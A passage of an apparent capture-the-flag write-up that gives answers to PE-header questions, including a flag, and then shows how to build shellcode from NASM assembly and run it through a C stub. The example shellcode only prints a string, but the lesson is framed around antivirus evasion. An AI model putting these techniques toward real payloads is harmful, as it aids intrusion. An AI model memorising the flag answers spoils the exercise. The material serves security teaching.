<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What is the last 6 digits of the MD5 hash value of the thm-intro2PE.exe file? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">530949</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What is the Magic number value of the thm-intro2PE.exe file (in Hex)? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">5A4D</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What is the Entry Point value of the thm-intro2PE.exe file? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">12E4</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> How many Sections does the thm-intro2PE.exe file have? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">7</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> A custom section could be used to store extra data. Malware developers use this technique to create a new section that contains their malicious code and hijack the flow of the program to jump and execute the content of the new section. What is the name of the extra section? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.flag</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Check the content of the extra section. What is the flag? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{PE-N3w-s3ction!}</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-4-introduction-to-shellcode">Task 4 Introduction to Shellcode<a href="#task-4-introduction-to-shellcode" class="hash-link" aria-label="Direct link to Task 4 Introduction to Shellcode" title="Direct link to Task 4 Introduction to Shellcode" translate="no">​</a></h2>
<p>Shellcode is a set of crafted machine code instructions that tell the vulnerable program to run additional functions and, in most cases, provide access to a system shell or create a reverse command shell.</p>
<p>Once the shellcode is injected into a process and executed by the vulnerable software or program, it modifies the code run flow to update registers and functions of the program to execute the attacker&#x27;s code.</p>
<p>It is generally written in Assembly language and translated into hexadecimal opcodes (operational codes). Writing unique and custom shellcode helps in evading AV software significantly. But writing a custom shellcode requires excellent knowledge and skill in dealing with Assembly language, which is not an easy task!</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="a-simple-shellcode">A Simple Shellcode<a href="#a-simple-shellcode" class="hash-link" aria-label="Direct link to A Simple Shellcode" title="Direct link to A Simple Shellcode" translate="no">​</a></h3>
<p>In order to craft your own shellcode, a set of skills is required:</p>
<ul>
<li class="">A decent understanding of x86 and x64 CPU architectures.</li>
<li class="">Assembly language.</li>
<li class="">Strong knowledge of programming languages such as C.</li>
<li class="">Familiarity with the Linux and Windows operating systems.</li>
</ul>
<p>To generate our own shellcode, we need to write and extract bytes from the assembler machine code. For this task, we will be using the AttackBox to create a simple shellcode for Linux that writes the string &quot;THM, Rocks!&quot;. The following assembly code uses two main functions:</p>
<ul>
<li class="">System Write function (sys_write) to print out a string we choose.</li>
<li class="">System Exit function (sys_exit) to terminate the execution of the program.</li>
</ul>
<p>To call those functions, we will use <strong>syscalls</strong>. A syscall is the way in which a program requests the kernel to do something. In this case, we will request the kernel to write a string to our screen, and the exit the program. Each operating system has a different calling convention regarding syscalls, meaning that to use the write in Linux, you&#x27;ll probably use a different syscall than the one you&#x27;d use on Windows. For 64-bits Linux, you can call the needed functions from the kernel by setting up the following values:</p>
<table><thead><tr><th style="text-align:left">rax</th><th style="text-align:left">System Call</th><th style="text-align:left">rdi</th><th style="text-align:left">rsi</th><th style="text-align:left">rdx</th></tr></thead><tbody><tr><td style="text-align:left">0x1</td><td style="text-align:left">sys_write</td><td style="text-align:left">unsigned int fd</td><td style="text-align:left">const char *buf</td><td style="text-align:left">size_t count</td></tr><tr><td style="text-align:left">0x3c</td><td style="text-align:left">sys_exit</td><td style="text-align:left">int error_code</td><td style="text-align:left"></td><td style="text-align:left"></td></tr></tbody></table>
<p>The table above tells us what values we need to set in different processor registers to call the sys_write and sys_exit functions using syscalls. For 64-bits Linux, the rax register is used to indicate the function in the kernel we wish to call. Setting rax to 0x1 makes the kernel execute sys_write, and setting rax to 0x3c will make the kernel execute sys_exit. Each of the two functions require some parameters to work, which can be set through the rdi, rsi and rdx registers. You can find a complete reference of available 64-bits Linux syscalls here.</p>
<p>For <strong>sys_write</strong>, the first parameter sent through <strong>rdi</strong> is the file descriptor to write to. The second parameter in <strong>rsi</strong> is a pointer to the string we want to print, and the third in <strong>rdx</strong> is the size of the string to print.</p>
<p>For <strong>sys_exit</strong>, rdi needs to be set to the exit code for the program. We will use the code 0, which means the program exited successfully.</p>
<p>Copy the following code to your AttackBox in a file called <strong>thm.asm</strong>:</p>
<div class="language-asm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-asm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">global _start</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">section .text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">_start:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    jmp MESSAGE      ; 1) let&#x27;s jump to MESSAGE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GOBACK:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rax, 0x1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rdi, 0x1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    pop rsi          ; 3) we are popping into `rsi`; now we have the</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                     ; address of &quot;THM, Rocks!\r\n&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rdx, 0xd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    syscall</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rax, 0x3c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rdi, 0x0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    syscall</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MESSAGE:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    call GOBACK       ; 2) we are going back, since we used `call`, that means</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                      ; the return address, which is, in this case, the address</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                      ; of &quot;THM, Rocks!\r\n&quot;, is pushed into the stack.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    db &quot;THM, Rocks!&quot;, 0dh, 0ah</span><br></span></code></pre></div></div>
<p>Let&#x27;s explain the ASM code a bit more. First, our message string is stored at the end of the .text section. Since we need a pointer to that message to print it, we will jump to the call instruction before the message itself. When <strong>call GOBACK</strong> is executed, the address of the next instruction after call will be pushed into the stack, which corresponds to where our message is. Note that the 0dh, 0ah at the end of the message is the binary equivalent to a new line (\r\n).</p>
<p>Next, the program starts the GOBACK routine and prepares the required registers for our first sys_write() function.</p>
<ul>
<li class="">We specify the sys_write function by storing 1 in the rax register.</li>
<li class="">We set rdi to 1 to print out the string to the user&#x27;s console (STDOUT).</li>
<li class="">We pop a pointer to our string, which was pushed when we called GOBACK and store it into rsi.</li>
<li class="">With the syscall instruction, we execute the sys_write function with the values we prepared.</li>
<li class="">For the next part, we do the same to call the sys_exit function, so we set 0x3c into the rax register and call the syscall function to exit the program.</li>
</ul>
<p>Next, we compile and link the ASM code to create an x64 Linux executable file and finally execute the program.</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Assembler and link our code</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ nasm </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> elf64 thm.asm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ ld thm.o </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> thm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ ./thm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">THM,Rocks</span><span class="token operator" style="color:#393A34">!</span><br></span></code></pre></div></div>
<p>We used the <strong>nasm</strong> command to compile the asm file, specifying the <strong>-f elf64</strong> option to indicate we are compiling for 64-bits Linux. Notice that as a result we obtain a .o file, which contains object code, which needs to be linked in order to be a working executable file. The <strong>ld</strong> command is used to link the object and obtain the final executable. The <strong>-o</strong> option is used to specify the name of the output executable file.</p>
<p>Now that we have the compiled ASM program, let&#x27;s extract the shellcode with the <strong>objdump</strong> command by dumping the .text section of the compiled binary.</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Dump the .text section</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ objdump </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> thm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">thm:     </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">format</span><span class="token plain"> elf64-x86-64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disassembly of section .text:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0000000000400080 </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">_start</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">400080</span><span class="token plain">:    eb 1e                    jmp    4000a0 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0000000000400082 </span><span class="token builtin class-name">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">400082</span><span class="token plain">:    b8 01 00 00 00           mov    </span><span class="token variable" style="color:#36acaa">$0x1</span><span class="token plain">,%eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">400087</span><span class="token plain">:    bf 01 00 00 00           mov    </span><span class="token variable" style="color:#36acaa">$0x1</span><span class="token plain">,%edi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  40008c:    5e                       pop    %rsi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  40008d:    ba 0d 00 00 00           mov    </span><span class="token variable" style="color:#36acaa">$0xd</span><span class="token plain">,%edx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">400092</span><span class="token plain">:    0f 05                    syscall </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">400094</span><span class="token plain">:    b8 3c 00 00 00           mov    </span><span class="token variable" style="color:#36acaa">$0x3c</span><span class="token plain">,%eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">400099</span><span class="token plain">:    bf 00 00 00 00           mov    </span><span class="token variable" style="color:#36acaa">$0x0</span><span class="token plain">,%edi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  40009e:    0f 05                    syscall </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00000000004000a0 </span><span class="token builtin class-name">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000a0:    e8 </span><span class="token function" style="color:#d73a49">dd</span><span class="token plain"> ff ff ff           callq  </span><span class="token number" style="color:#36acaa">400082</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000a5:    </span><span class="token number" style="color:#36acaa">54</span><span class="token plain">                       push   %rsp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000a6:    </span><span class="token number" style="color:#36acaa">48</span><span class="token plain">                       rex.W</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000a7:    4d 2c </span><span class="token number" style="color:#36acaa">20</span><span class="token plain">                 rex.WRB sub </span><span class="token variable" style="color:#36acaa">$0x20</span><span class="token plain">,%al</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000aa:    </span><span class="token number" style="color:#36acaa">52</span><span class="token plain">                       push   %rdx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000ab:    6f                       outsl  %ds:</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">%rsi</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">,</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">%dx</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000ac:    </span><span class="token number" style="color:#36acaa">63</span><span class="token plain"> 6b </span><span class="token number" style="color:#36acaa">73</span><span class="token plain">                 movslq 0x73</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">%rbx</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">,%ebp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000af:    </span><span class="token number" style="color:#36acaa">21</span><span class="token plain">                       .byte 0x21</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000b0:    0d                       .byte 0xd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000b1:    0a                       .byte 0xa</span><br></span></code></pre></div></div>
<p>Now we need to extract the hex value from the above output. To do that, we can use <strong>objcopy</strong> to dump the <strong>.text</strong> section into a new file called <strong>thm.text</strong> in a binary format as follows:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ objcopy </span><span class="token parameter variable" style="color:#36acaa">-j</span><span class="token plain"> .text </span><span class="token parameter variable" style="color:#36acaa">-O</span><span class="token plain"> binary thm thm.text</span><br></span></code></pre></div></div>
<p>The thm.text contains our shellcode in binary format, so to be able to use it, we will need to convert it to hex first. The <strong>xxd</strong> command has the <strong>-i</strong> option that will output the binary file in a C string directly:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Output the hex equivalent to our shellcode</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ xxd </span><span class="token parameter variable" style="color:#36acaa">-i</span><span class="token plain"> thm.text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unsigned char new_text</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x0d, 0x0a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unsigned int new_text_len </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">50</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>Finally, we have it, a formatted shellcode from our ASM assembly. That was fun! As we see, dedication and skills are required to generate shellcode for your work!</p>
<p>To confirm that the extracted shellcode works as we expected, we can execute our shellcode and inject it into a C program.</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;stdio.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> argc</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">argv</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> message</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0xeb</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x1e</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xb8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x01</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xbf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x01</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0x5e</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xba</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0d</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0f</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x05</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xb8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x3c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xbf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0f</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x05</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xe8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xdd</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xff</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xff</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0xff</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x54</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x4d</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x2c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x20</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x52</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x6f</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x63</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x6b</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x73</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x21</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0x0d</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0a</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">message</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>Then, we compile and execute it as follows,</p>
